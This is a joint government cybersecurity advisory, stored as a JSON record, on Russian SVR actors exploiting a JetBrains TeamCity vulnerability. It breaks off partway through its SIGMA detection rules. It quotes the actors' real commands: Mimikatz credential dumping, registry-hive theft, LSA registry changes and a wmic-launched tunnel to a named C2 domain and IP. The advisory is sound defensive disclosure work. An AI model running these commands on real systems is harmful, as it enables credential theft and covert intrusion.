{
    "id": "9501def3-3e75-488b-935d-7078965b40f4",
    "created_at": "2023-12-21T02:04:17.910859Z",
    "updated_at": "2024-11-22T02:03:23.766303Z",
    "deleted_at": null,
    "sha1_hash": "443181071d70821ccd4f78533f8b6b9947dc4b46",
    "title": "Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally",
    "authors": "CISA",
    "file_creation_date": "2023-12-13T14:17:36Z",
    "file_modification_date": "2023-12-13T14:17:45Z",
    "file_size": 793237,
    "plain_text": "TLP:CLEAR\n\nCo-Authored by:\n\nProduct ID: AA23-347A\nDecember 13, 2023\n\nRussian Foreign Intelligence Service (SVR)\nExploiting JetBrains TeamCity CVE Globally\nSUMMARY\n\nThe U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency\n(CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW),\nCERT Polska (CERT.PL), and the UK\u2019s National Cyber Security Centre (NCSC) assess Russian\nForeign Intelligence Service (SVR) cyber actors\u2014also known as Advanced Persistent Threat 29 (APT\n29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard\u2014are exploiting CVE-2023-42793 at a\nlarge scale, targeting servers hosting JetBrains TeamCity software since September 2023.\nSoftware developers use TeamCity software to manage and automate software compilation, building,\ntesting, and releasing. If compromised, access to a TeamCity server would provide malicious actors\nwith access to that software developer\u2019s source code, signing certificates, and the ability to subvert\nsoftware compilation and deployment processes\u2014access a malicious actor could further use to\nconduct supply chain operations. Although the SVR used such access to compromise SolarWinds\nand its customers in 2020, limited number and seemingly opportunistic types of victims currently\nidentified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar\nmanner. The SVR has, however, been observed using the initial access gleaned by exploiting the\nTeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other\nsteps to ensure persistent and long-term access to the compromised network environments.\nTo bring Russia\u2019s actions to public attention, the authoring agencies are providing information on the\nSVR\u2019s most recent compromise to aid organizations in conducting their own investigations and\nsecuring their networks, provide compromised entities with actionable indicators of compromise\n(IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR\u2019s\nmalicious actions. The authoring agencies recommend all organizations with affected systems that\ndid not immediately apply available patches or workarounds to assume compromise and initiate threat\nhunting activities using the IOCs provided in this CSA. If potential compromise is detected,\nadministrators should apply the incident response recommendations included in this CSA and report\nkey findings to the FBI and CISA.\nU.S. organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory,\ncontact your local FBI field office or CISA\u2019s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available,\nplease include the following information regarding the incident: date, time, and location of the incident; type of activity;\nnumber of people affected; type of equipment used for the activity; the name of the submitting company or organization; and\na designated point of contact. SLTT organizations should report incidents to MS-ISAC (866-787-4722 or\nSOC@cisecurity.org).\nThis document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries\nminimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to\nstandard copyright rules, TLP:CLEAR information may be distributed without restrictions. For more information on the Traffic\nLight Protocol, see cisa.gov/tlp/.\n\nTLP:CLEAR\n\nInternational Partnership\n\nFor a downloadable copy of IOCs, see:\n\u2022\n\u2022\n\nAA23-347A (STIX XML, 77KB)\nAA23-347A (STIX JSON, 70KB)\n\nTHREAT OVERVIEW\nSVR cyber operations pose a persistent threat to public and private organizations\u2019 networks globally.\nSince 2013, cybersecurity companies and governments have reported on SVR operations targeting\nvictim networks to steal confidential and proprietary information. A decade later, the authoring\nagencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of,\nforeign intelligence, a broad concept that for Russia encompasses information on the politics,\neconomics, and military of foreign states; science and technology; and foreign counterintelligence.\nThe SVR also conducts cyber operations targeting technology companies that enable future cyber\noperations.\nA decade ago, public reports about SVR cyber activity focused largely on the SVR\u2019s spearphishing\noperations, targeting government agencies, think tanks and policy analysis organizations, educational\ninstitutions, and political organizations. This category of targeting is consistent with the SVR\u2019s\nresponsibility to collect political intelligence, the collection of which has long been the SVR\u2019s highest\npriority. For the Russian Government, political intelligence includes not only the development and\nexecution of foreign policies, but also the development and execution of domestic policies and the\npolitical processes that drive them. In December 2016, the U.S. Government published a Joint\nAnalysis Report titled \u201cGRIZZLY STEPPE \u2013 Russian Malicious Cyber Activity,\u201d which describes the\nSVR\u2019s compromise of a U.S. political party leading up to a presidential election. The SVR\u2019s use of\nspear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily\ntargeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report\ndescribing tools and techniques used by the SVR to target embassies in dozens of countries.\nLess frequently, reporting on SVR cyber activity has addressed other aspects of the SVR\u2019s foreign\nintelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published\nan advisory revealing the SVR\u2019s exploitation of CVEs to gain initial access to networks, and its\ndeployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations\ninvolved in COVID-19 vaccine development. Although not listed in the 2020 advisory, the authoring\nagencies can now disclose that the SVR\u2019s WellMess campaign also targeted energy companies.\nSuch biomedical and energy targets are consistent with the SVR\u2019s responsibility to support the\nRussian economy by pursuing two categories of foreign intelligence known as economic intelligence\nand science and technology.\nIn April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds\ninformation technology company and its customers to the SVR. This attribution marked the discovery\nthat the SVR had, since at least 2018, expanded the range of its cyber operations to include the\nwidespread targeting of information technology companies. At least some of this targeting was aimed\nat enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments\npublished advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the\n\nPage 2 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nSVR\u2019s use of \u201clow and slow\u201d password spraying techniques to gain initial access to some victims\u2019\nnetworks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.\nIn this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably\ncontinues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a\nsoftware development program, the authoring agencies assess the SVR could benefit from access to\nvictims, particularly by allowing the threat actors to compromise the networks of dozens of software\ndevelopers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR\u2019s\noperation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring\nagencies assess the SVR has not yet used its accesses to software developers to access customer\nnetworks and is likely still in the preparatory phase of its operation, having access to these\ncompanies\u2019 networks presents the SVR with opportunities to enable hard-to- detect command and\ncontrol (C2) infrastructure.\n\nTECHNICAL DETAILS\nNote: This advisory uses the MITRE ATT&CK\u00ae for Enterprise framework, version 14. See the MITRE\nATT&CK Tactics and Techniques section for a table of the threat actors\u2019 activity mapped to MITRE\nATT&CK\u00ae tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE\nATT&CK framework, see CISA and MITRE ATT&CK\u2019s Best Practices for MITRE ATT&CK Mapping\nand CISA\u2019s Decider Tool. While SVR followed a similar playbook in each compromise, they also\nadjusted to each operating environment and not all presented steps or actions below were executed\non every host.\n\nInitial Access - Exploitation\nThe SVR started to exploit Internet-connected JetBrains TeamCity servers [T1190] in late September\n2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for\nbypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies\u2019\nobservations show that the TeamCity exploitation usually resulted in code execution [T1203] with high\nprivileges granting the SVR an advantageous foothold in the network environment. The authoring\nagencies are not currently aware of any other initial access vector to JetBrains TeamCity currently\nbeing exploited by the SVR.\n\nHost Reconnaissance\nInitial observations show the SVR used the following basic, built-in commands to perform host\nreconnaissance [T1033],[T1059.003],[T1592.002]:\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\nwhoami /priv\nwhoami /all\nwhoami /groups\nwhoami /domain\nnltest -dclist\nnltest -dsgetdc\ntasklist\nnetstat\n\nPage 3 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\nwmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\"\" /password:\"\"<redacted>\"\" process list brief\nwmic /node:\"\"<redacted>\"\" process list brief\nwmic process get commandline -all\nwmic process <proc_id> get commandline\nwmic process where name=\"\"GoogleCrashHandler64.exe\"\" get commandline,processed\npowershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties\npowershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties.memberof\npowershell Get-WmiObject -Class Win32_Service -Computername\npowershell Get-WindowsDriver -Online -All\n\nFile Exfiltration\nAdditionally, the authoring agencies have observed the SVR exfiltrating files [T1041] which may\nprovide insight into the host system\u2019s operating system:\nC:\\Windows\\system32\\ntoskrnl.exe to precisely identify system version, likely as a prerequisite\nto deploy EDRSandBlast.\n\uf0a7 SQL Server executable files - based on the review of the post exploitation actions, the SVR\nshowed an interest in specific files of the SQL Server installed on the compromised systems:\n\uf0a7 C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll,\n\uf0a7 C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll,\n\uf0a7 C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll,\n\uf0a7 C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll\n\uf0a7 C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\secforwarder.dll\n\uf0a7 Visual Studio files \u2013 based on the review of the post exploitation actions, the SVR showed an\ninterest in specific files of the Visual Studio:\n\uf0a7 C:\\Program Files (x86)\\Microsoft Visual\nStudio\\2017\\SQL\\Common7\\IDE\\VSIXAutoUpdate.exe\n\uf0a7 Update management agent files \u2013 based on the review of the post exploitation actions, the\nSVR showed an interest in executables and configuration of patch management software:\no C:\\Program Files (x86)\\PatchManagementInstallation\\Agent\\12\\Httpd\\bin\\httpd.exe\no C:\\Program Files (x86)\\PatchManagementInstallation\\Agent\\12\\Httpd\no C:\\ProgramData\\GFI\\LanGuard 12\\HttpdConfig\\httpd.conf\n\n\uf0a7\n\nInterest in SQL Server\nBased on the review of the exploitation, the SVR also showed an interest in details of the SQL Server\n[T1059.001],[T1505.001]:\n\uf0a7\n\npowershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\",\"C:\\Program Files\\Microsoft SQL\n\nPage 4 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\n\uf0a7\n\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll\",\"C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll\",\"C:\\Program Files\\Microsoft SQL\nServer\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll\" -DestinationPath\nC:\\Windows\\temp\\1\\sql.zip\nSVR cyber actors also exfiltrated secforwarder.dll\n\nTactics Used to Avoid Detection\nTo avoid detection, the SVR used a \u201cBring Your Own Vulnerable Driver\u201d [T1068] technique to disable\nor outright kill endpoint detection and response (EDR) and antivirus (AV) software [T1562.001].\nThis was done using an open source project called \u201cEDRSandBlast.\u201d The authoring agencies have\nobserved the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is\nused for controlling and protecting running processes and protecting them from infection. The actors\nthen inject code into AV/EDR processes for a small subset of victims [T1068]. Additionally,\nexecutables that are likely to be detected (i.e. Mimikatz) were executed in memory [T1003.001].\nIn several cases SVR attempted to hide their backdoors via:\n\uf0a7\n\uf0a7\n\n\uf0a7\n\nAbusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL\nwith their one containing GraphicalProton backdoor,\nBackdooring an open source application developed by Microsoft named vcperf. SVR modified\nand copied publicly available source code. After execution, backdoored vcperf dropped\nseveral DLLs to disc, one of those being a GraphicalProton backdoor,\nAbusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate\nDLL with one containing GraphicalProton backdoor.\n\nTo avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft\nOneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware\nvia OneDrive and Dropbox were hidden inside randomly generated BMP files [T1564], illustrated\nbelow:\n\nPrivilege Escalation\nTo facilitate privilege escalation [T1098], the SVR used multiple techniques, including WinPEAS,\nNoLMHash registry key modification, and the Mimikatz tool.\nThe SVR modified the NoLMHash registry using the following reg command:\n\uf0a7\n\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v NoLMHash /t\nREG_DWORD /d \"0\" /f\n\nPage 5 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nThe SVR used the following Mimikatz commands [T1003]:\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\nprivilege::debug\nlsadump::cache\nlsadump::secrets\nlsadump::sam\nsekurlsa::logonpasswords\n\nPersistence\nThe SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors.\nDepending on the privileges the SVR had, their executables were stored in one of following\ndirectories:\n\uf0a7\n\uf0a7\n\uf0a7\n\nC:\\Windows\\temp\nC:\\Windows\\System32\nC:\\Windows\\WinStore\n\nThe SVR made all modifications using the schtasks.exe binary. It then had multiple variants of\narguments passed to schtasks.exe, which can be found in Appendix B \u2013 Indicators of\nCompromise.\nTo secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket\nGranting Tickets (TGTs) [T1558.001].\n\nSensitive Data Exfiltration [T1020]\nThe SVR exfiltrated the following Windows Registry hives from its victims [T1003]:\n\uf0a7\n\uf0a7\n\uf0a7\n\nHKLM\\SYSTEM\nHKLM\\SAM\nHKLM\\SECURITY\n\nIn order to exfiltrate Windows Registry, the SVR saved hives into files [T1003.002], packed them, and\nthen exfiltrated them using a backdoor capability. it used \u201creg save\u201d to save SYSTEM, SAM and\nSECURITY registry hives, and used powershell to stage .zip archives in the C:\\Windows\\Temp\\\ndirectory.\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\nreg save HKLM\\SYSTEM \"\"C:\\Windows\\temp\\1\\sy.sa\"\" /y\nreg save HKLM\\SAM \"\"C:\\Windows\\temp\\1\\sam.sa\"\" /y\nreg save HKLM\\SECURITY \"\"C:\\Windows\\temp\\1\\se.sa\"\" /y\npowershell Compress-Archive -Path C:\\Windows\\temp\\1\\ -DestinationPath\nC:\\Windows\\temp\\s.zip -Force & del C:\\Windows\\temp\\1 /F /Q\n\nIn a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such\nas session cookies, browsing history, or saved logins.\nSVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to\nobtain a sensitive Domain information.\n\nNetwork Reconnaissance\nPage 6 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nAfter the SVR built a secure foothold and gained an awareness of a victim\u2019s TeamCity server, it then\nfocused on network reconnaissance [T1590.004]. The SVR performed network reconnaissance using\na mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it\nlaunched into memory [T1046]. The SVR executed the following PowerSploit commands:\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\nGet-NetComputer\nGet-NetGroup\nGet-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description,\npwdlastset, logoncount, badpwdcount\"\nGet-NetDiDomain\nGet-AdUser\nGet-DomainUser -UserName\nGet-NetUser -PreauthNotRequire\nGet-NetComputer | select samaccountname\nGet-NetUser -SPN | select serviceprincipalname\n\nTunneling into Compromised Environments\nIn selected environments the SVR used an additional tool named, \u201crr.exe\u201d\u2014a modified open source\nreverse socks tunneler named Rsockstun\u2014to establish a tunnel to the C2 infrastructure [T1572].\nThe authoring agencies are aware of the following infrastructure used in conjunction with \u201crr.exe\u201d:\n\uf0a7\n\uf0a7\n\n65.20.97[.]203:443\nPoetpages[.]com:8443\n\nThe SVR executed Rsockstun either in memory or using the Windows Management Instrumentation\nCommand Line (WMIC) [T1047] utility after dropping it to disk:\n\uf0a7\n\nwmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat\nProtection\\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31\"\n\nLateral Movement\nThe SVR used WMIC to facilitate lateral movement [T1047],[T1210].\n\uf0a7\n\nwmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\" /password:\"\"<redacted>\"\" process call create\n\"\"rundll32 C:\\Windows\\system32\\AclNumsInvertHost.dll AclNumsInvertHost\"\"\n\nThe SVR also modified DisableRestrictedAdmin key to enable remote connections [T1210].\nIt modified Registry using the following reg command:\n\uf0a7\n\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v\nDisableRestrictedAdmin /t REG_DWORD /d \"0\" /f\n\nAdversary Toolset\nIn the course of the TeamCity operation, the SVR used multiple custom and open source available\ntools and backdoors. The following custom tools were observed in use during the operation:\n\nPage 7 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\n\uf0a7\n\uf0a7\n\n\uf0a7\n\nGraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly\ngenerated BMPs [T1027.001] to exchange data with the SVR operator.\nAfter execution, GraphicalProton gathers environment information such as active TCP/UDP\nconnections [T1049], running processes [T1049], as well as user, host, and domain names\n[T1590]. OneDrive is used as a primary communication channel while Dropbox is treated as a\nbackup channel [T1567]. API keys are hardcoded into the malware. When communicating with\ncloud services, GraphicalProton generates a randomly named directory which is used to store\ninfection-specific BMP files - with both commands and results [T1564.001]. Directory name is\nre-randomized each time the GraphicalProton process is started.\nBMP files that were used to exchange data were generated in the following way:\n1. Compress data using zlib,\n2. Encrypt data using custom algorithm,\n3. Add \u201c***\u201d string literal to encrypted data,\n4. Create a random BMP with random rectangle,\n5. And finally, encode encrypted data within lower pixel bits.\n\nWhile the GraphicalProton backdoor has remained mostly unchanged over the months we have been\ntracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation,\nencryption, encoders, and stagers. Two specific variants of GraphicalProton \u201cpackaging\u201d are\nespecially noteworthy \u2013 a variant that uses DLL hijacking [T1574.002] in Zabbix as a means to start\nexecution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself\nwithin vcperf [T1036], an open-source C++ build analysis tool from Microsoft.\n\uf0a7\n\nGraphicalProton HTTPS variant \u2013 a variant of GraphicalProton backdoor recently introduced\nby the SVR that forgoes using cloud-based services as a C2 channel and instead relies on\nHTTP request.\nTo legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy\nWordPress website. Execution of HTTPS variant of GraphicalProton is split into two files \u2013\nstager and encrypted binary file that contains further code.\n\nMITRE ATT&CK TACTICS AND TECHNIQUES\nSee below tables for all referenced threat actor tactics and techniques in this advisory. For additional\nmitigations, see the Mitigations section.\nTable 1: SVR Cyber Actors ATT&CK Techniques for Enterprise - Reconnaissance\nTechnique Title\nGather Victim Network\nInformation: Network Topology\n\nID\nT1590.004\n\nUse\nSVR cyber actors may gather\ninformation about the victim\u2019s\nnetwork topology that can be used\nduring targeting.\n\nPage 8 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nGather Victim Host Information:\nSoftware\n\nT1592.002\n\nSVR cyber actors may gather\ninformation about the victim\u2019s host\nnetworks that can be used during\ntargeting.\n\nTable 2: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise \u2013 Initial Access\nTechnique Title\nExploit Public-Facing Application\n\nID\nT1190\n\nUse\nSVR cyber actors exploit internetconnected JetBrains TeamCity server\nusing CVE-2023-42793 for initial\naccess.\n\nTable 3: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise: Execution\nTechnique Title\n\nID\n\nUse\n\nCommand and Scripting\nInterpreter: PowerShell\n\nT1059.001\n\nSVR cyber actors used powershell\ncommands to compress Microsoft\nSQL server .dll files.\n\nCommand and Scripting\nInterpreter: Windows Command\nShell\n\nT1059.003\n\nSVR cyber actors execute these\npowershell commands to perform\nhost reconnaissance:\n\u2022 powershell\n([adsisearcher]\"((samaccountn\name=<redacted>))\").Findall().P\nroperties\n\u2022 powershell\n([adsisearcher]\"((samaccountn\name=<redacted>))\").Findall().P\nroperties.memberof\n\u2022 powershell Get-WmiObject Class Win32_Service Computername\n\u2022 powershell Get-WindowsDriver\n-Online -All\n\nExploitation for Client Execution\n\nT1203\n\nSVR cyber actors leverage arbitrary\ncode execution after exploiting CVE2023-42793.\n\nPage 9 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nHijack Execution Flow: DLL\nSide-Loading\n\nT1574.002\n\nSVR cyber actors use a variant of\nGraphicalProton that uses DLL\nhijacking in Zabbix as a means to\nstart execution.\n\nTable 4: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise: Persistence\nTechnique Title\n\nID\n\nUse\n\nScheduled Task\n\nT1053.005\n\nSVR cyber actors may abuse\nWindows Task Schedule to perform\ntask scheduling for initial or recurring\nexecution of malicious code.\n\nServer Software Component:\nSQL Stored Procedures\n\nT1505.001\n\nSVR cyber actors abuse SQL server\nstored procedures to maintain\npersistence.\n\nBoot or Logon Autostart\nExecution\n\nT1547\n\nSVR cyber actors used\nC:\\Windows\\system32\\ntoskrnl.exe\nto configure automatic system boot\nsettings to maintain persistence.\n\nTable 5: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise: Privilege Escalation\nTechnique Title\nExploitation for Privilege\nEscalation\n\nID\nT1068\n\nUse\nSVR cyber actors exploit JetBrains\nTeamCity vulnerability to achieve\nescalated privileges.\nTo avoid detection, the SVR cyber\nactors used a \u201cBring Your Own\nVulnerable Driver\u201d technique to\ndisable EDR and AV defense\nmechanisms.\n\nAccount Manipulation\n\nT1098\n\nSVR cyber actors may manipulate\naccounts to maintain and/or elevate\naccess to victim systems.\n\nPage 10 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nTable 6: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise: Defense Evasion\nTechnique Title\n\nID\n\nUse\n\nObfuscated Files or Information:\nBinary Padding\n\nT1027.001\n\nSVR cyber actors use BMPs to\nperform binary padding while\nexchange data is exfiltrated to an\ntheir C2 station.\n\nMasquerading\n\nT1036\n\nSVR cyber actors use a variant that\nuses DLL hijacking in Zabbix as a\nmeans to start execution (and\npotentially provide long-term, hard-todetect access) and a variant that\nmasks itself within vcperf, an opensource C++ build analysis tool from\nMicrosoft.\n\nProcess Injection\n\nT1055\n\nSVR cyber actors inject code into AV\nand EDR processes to evade\ndefenses.\n\nDisable or Modify Tools\n\nT1562.001\n\nSVR cyber actors may modify and/or\ndisable tools to avoid possible\ndetection of their malware/tools and\nactivities.\n\nHide Artifacts\n\nT1564\n\nSVR cyber actors may attempt to\nhide artifacts associated with their\nbehaviors to evade detection.\n\nHide Artifacts: Hidden Files and\nDirectories\n\nT1564.001\n\nWhen communicating with cloud\nservices, GraphicalProton generates\na randomly named directory which is\nused to store infection-specific BMP\nfiles - with both commands and\nresults.\n\nTable 7: SVR Cyber actors\u2019 ATT&CK Techniques for Enterprise: Credential Access\nTechnique Title\nOS Credential Dumping: LSASS\nMemory\n\nID\nT1003.001\n\nUse\nSVR cyber actors executed Mimikatz\ncommands in memory to gain access\nto credentials stored in memory.\n\nPage 11 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nOS Credential Dumping: Security T1003.002\nAccount Manager\n\nSVR cyber actors used:\n\u2022\n\u2022\n\u2022\n\u2022\n\u2022\n\nprivilege::debug\nlsadump::cache\nlsadump::secrets\nlsadump::sam\nsekurlsa::logonpasswords\n\nMimikatz commands to gain access\nto credentials.\nAdditionally, SVR cyber actors\nexfiltrated Windows registry hives to\nsteal credentials.\n\u2022\n\u2022\n\u2022\n\nHKLM\\SYSTEM\nHKLM\\SAM\nHKLM\\SECURITY\n\nCredentials from Password\nStores: Credentials from Web\nBrowsers\n\nT1555.003\n\nIn a few specific cases, the SVR\nused the SharpChromium tool to\nobtain sensitive browser data such as\nsession cookies, browsing history, or\nsaved logins.\n\nSteal or Forge Kerberos Tickets:\nGolden Ticket\n\nT1558.001\n\nTo secure long-term access to the\nenvironment, the SVR used the\nRubeus toolkit to craft Ticket\nGranting Tickets (TGTs).\n\nTable 8: SVR Cyber Actors ATT&CK Techniques for Enterprise: Discovery\nTechnique Title\n\nID\n\nUse\n\nSystem Owner/User Discovery\n\nT1033\n\nSVR cyber actors use these built-in\ncommands to perform host\nreconnaissance: whoami /priv,\nwhoami / all, whoami / groups,\nwhoami / domain to perform user\ndiscovery.\n\nNetwork Service Discovery\n\nT1046\n\nSVR cyber actors performed\nnetwork reconnaissance using a\nmix of built-in commands and\nadditional tools, such as port\nscanner and PowerSploit.\n\nPage 12 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nProcess Discovery\n\nT1057\n\nSVR cyber actors use\nGraphicalProton to gather running\nprocesses data.\n\nGather Victim Network\nInformation\n\nT1590\n\nSVR cyber actors use\nGraphicalProton to gather victim\nnetwork information.\n\nTable 9: SVR Cyber Actors ATT&CK Techniques for Enterprise: Lateral Movement\nTechnique Title\n\nID\n\nUse\n\nExploitation of Remote Services\n\nT1210\n\nSVR cyber actors may exploit remote\nservices to gain unauthorized access\nto internal systems once inside a\nnetwork.\n\nWindows Management\nInstrumentation\n\nT1047\n\nSVR cyber actors executed\nRsockstun either in memory or\nusing Windows Management\nInstrumentation (WMI) to execute\nmalicious commands and\npayloads.\nwmic process call create\n\"C:\\Program Files\\Windows\nDefender Advanced Threat\nProtection\\Sense.exe -connect\npoetpages.com -pass M5540sddsf2@34232fsl45t31\"\n\nTable 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and Control\nTechnique Title\n\nID\n\nUse\n\nDynamic Resolution\n\nT1568\n\nSVR may dynamically establish\nconnections to command-and-control\ninfrastructure to evade common\ndetections and remediations.\n\nProtocol Tunneling\n\nT1572\n\nSVR cyber actors may tunnel\nnetwork communications to and\nfrom a victim system within a\nseparate protocol to avoid\ndetection/network filtering and/or\nenable access to otherwise\nunreachable systems.\n\nPage 13 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nIn selected environments, the SVR\nused an additional tool named,\n\u201crr.exe\u201d\u2014a modified open source\nreverse socks tunneler named\nRsockstunm\u2014to establish a tunnel\nto the C2 infrastructure.\nTable 11: SVR Cyber Actors ATT&CK Techniques for Enterprise: Exfiltration\nTechnique Title\n\nID\n\nUse\n\nAutomated Exfiltration\n\nT1020\n\nSVR cyber actors may exfiltrate data,\nsuch as sensitive documents,\nthrough the use of automated\nprocessing after being gathered\nduring collection.\n\nExfiltration Over C2 Channel\n\nT1041\n\nSVR cyber actors may steal data\nby exfiltrating it over an existing C2\nchannel. Stolen data is encoded\ninto normal communications using\nthe same protocol as C2\ncommunications.\n\nExfiltration Over Web Service\n\nT1567\n\nSVR cyber actors use OneDrive\nand Dropbox to exfiltrate data to\ntheir C2 station.\n\nINDICATORS OF COMPROMISE\nNote: Please refer to Appendix B for a list of IOCs.\n\nVICTIM TYPES\nAs a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC\nhave identified a few dozen compromised companies in the United States, Europe, Asia, and\nAustralia, and are aware of over a hundred compromised devices though we assess this list does not\nrepresent the full set of compromised organizations. Generally, the victim types do not fit into any sort\nof pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server,\nleading to the assessment that SVR\u2019s exploitation of these victims\u2019 networks was opportunistic in\nnature and not necessarily a targeted attack. Identified victims included: an energy trade association;\ncompanies that provide software for billing, medical devices, customer care, employee monitoring,\nfinancial management, marketing, sales, and video games; as well as hosting companies, tools\nmanufacturers, and small and large IT companies.\n\nPage 14 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nDETECTION METHODS\nThe following rules can be used to detect activity linked to adversary activity. These rules should\nserve as examples and adapt to each organization\u2019s environment and telemetry.\n\nSIGMA rules\nPresented SIGMA rules target identified operators\u2019 behavior patterns and can be used for the threat\nhunting against collected logs.\ntitle: Privilege information listing via whoami\ndescription: Detects whoami.exe execution and listing of privileges\nauthor:\nreferences: https://learn.microsoft.com/en-us/windows-server/administration/windowscommands/whoami\ndate: 2023/11/15\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nImage|endswith:\n- 'whoami.exe'\nCommandLine|contains:\n- 'priv'\n- 'PRIV'\ncondition: selection\nfalsepositives: legitimate use by system administrator\ntitle: DC listing via nltest\ndescription: Detects nltest.exe execution and DC listing\nauthor:\nreferences:\ndate: 2023/11/15\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nImage|endswith:\n- 'nltest.exe'\nCommandLine|re: 